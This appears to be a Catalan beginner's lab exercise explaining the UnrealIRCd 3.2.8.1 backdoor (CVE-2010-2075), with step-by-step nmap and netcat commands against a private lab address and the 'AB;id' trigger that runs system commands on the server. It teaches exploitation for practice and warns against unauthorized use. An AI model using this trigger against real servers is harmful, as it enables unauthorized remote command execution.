---
id: EX-08-19
title: "UnrealIRCd backdoor - Explicat per a gent inexperta"
status: draft
version: 2.0
created: 2026-08-07
updated: 2026-08-07
authors:
  - Bernat Mora
  - Hermes Agent
tags:
  - per-a-principiants
  - explicacio-detallada
prerequisites:
  - LAB-15-10
  - ANN-09
related:
  - LAB-15-10
  - ANN-08
  - ANN-09
estimated_time: 30 min
difficulty: beginner
---

# EX-08-19 - UnrealIRCd backdoor - Explicat per a gent inexperta

> Aprendre com funciona una porta del darrere a UnrealIRCd.

## Que necessites saber

### Que es IRC?

**IRC** (Internet Relay Chat) es un **protocol de xat** antic. Permet xatejar en temps real amb canals tematics.

Exemple: `#linux` es un canal IRC sobre Linux.

### Que es UnrealIRCd?

**UnrealIRCd** es un **servidor IRC** molt utilitzat. Permet allotjar el teu propi servidor IRC.

### Que es la porta del darrere?

Igual que vsFTPd, **UnrealIRCd 3.2.8.1** te una **porta del darrere** que permet executar comandes al servidor.

Es la **CVE-2010-2075**.

### Que es netcat?

Si no saps que es netcat, llegeix [EX-08-13](ex-08-13-vsftpd-backdoor-exploit.md).

### Que es AB;id?

En el protocol IRC, pots enviar **comandes** al servidor. Si el servidor te backdoor, pots ficar una **adreça AB** seguida d'una **comanda** del sistema:

```
AB;id
```

Aixo executa `id` al servidor IRC i et mostra el resultat.

### Glossari

- **IRC**: protocol de xat
- **UnrealIRCd**: servidor IRC
- **CVE-2010-2075**: backdoor a UnrealIRCd 3.2.8.1
- **backdoor**: porta del darrere
- **netcat**: eina de connexions

## Que has de fer

1. Des del Kali, obre una terminal
2. Comprova el servei: `nmap -sV -p 6667 10.10.30.30`
3. Connecta al IRC: `nc -nv 10.10.30.30 6667`
4. Si veus `UnrealIRCd`, envia: `AB;id`
5. Si funciona, veuras la sortida de la comanda `id`
6. Prova altres comandes: `whoami`, `ls /`
7. Desconecta amb Ctrl+C

## Que has de buscar

- Quin servidor IRC hi ha?
- Es la versio vulnerable?
- Quin CVE te?
- Quines comandes pots executar?
- Com podem protegir l'IRC?

## Preguntes que has de respondre

1. Que es IRC?
2. Has aconseguit executar comandes?
3. Quin CVE te UnrealIRCd 3.2.8.1?
4. Com podem protegir el IRC?

## Si no entens alguna cosa

1. **Torna a llegir** la seccio "Que necessites saber"
2. **Mira** [ANN-09](ann-09-comencar-de-zero.md) - Guia per a gent inexperta
3. **Mira** [ANN-08](ann-08-glossari-ports.md) - Glossari de ports
4. **Pregunta** si segueixes sense entendre

## Solucio de problemes

Si alguna cosa no funciona:

1. **Comprova** que el lab esta actiu (`docker ps` al Kali)
2. **Comprova** que tens acces a Internet des del Kali
3. **Comprova** que la IP que estas fent servir es correcta
4. **Llegeix** l'error amb atencio - sovint diu que passa

## Validacio

Quan acabis, compara els teus resultats amb els del document [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md).

## Seguretat

**Recorda**:
- Aixo es **nomes per practicar** al lab
- Mai en sistemes **reals** sense permis
- Practicar sense permis es **IL·LEGAL**
- Si tens dubtes, pregunta

## Referencies

- [ANN-09](ann-09-comencar-de-zero.md) - Començar de zero
- [ANN-08](ann-08-glossari-ports.md) - Glossari de ports
- [LAB-15-10](../labs/lab-15-10-lab-real-muntat.md) - Lab real muntat al Kali
- [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md) - Nmap complet
